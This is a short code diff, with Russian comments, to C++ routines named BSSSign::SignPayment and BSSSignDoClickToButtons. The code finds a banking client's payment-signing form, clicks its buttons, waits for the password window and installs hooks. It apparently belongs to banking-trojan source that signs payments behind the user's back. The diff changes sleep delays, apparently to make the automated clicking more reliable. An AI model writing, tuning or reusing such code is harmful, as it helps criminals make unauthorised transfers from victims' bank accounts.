@@ -174,11 +174,12 @@ void BSSSignDoClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash, D
 		}
 
 		// Кликаем по кнопке
-		pSleep(100);
+
 	
 		if (HardClickToWindow(Button, 5, 5))
 		{
 			Count++;
+			pSleep(1000);
 			if (!MultiClick) return;
         }
 	}
@@ -212,7 +213,7 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 	if (Form == NULL) return 0;
 
 
-	pSleep(1000);
+	pSleep(1500);
 
 	SignState = true;
 	PasswordForm = NULL;
@@ -228,7 +229,7 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 		WaitPasswordWnd(BSSSign::PasswordForm);
 
 	// Кликаем по кнопкам закрытия окна
-	pSleep(1000);
+	pSleep(2000);
 	if (pIsWindowVisible(Form))
 	{
 		DWORD Closed = 0;
@@ -514,5 +515,7 @@ void BSSSign::Initialize()
 
 	SetHooks();
 }
+
+
 
 
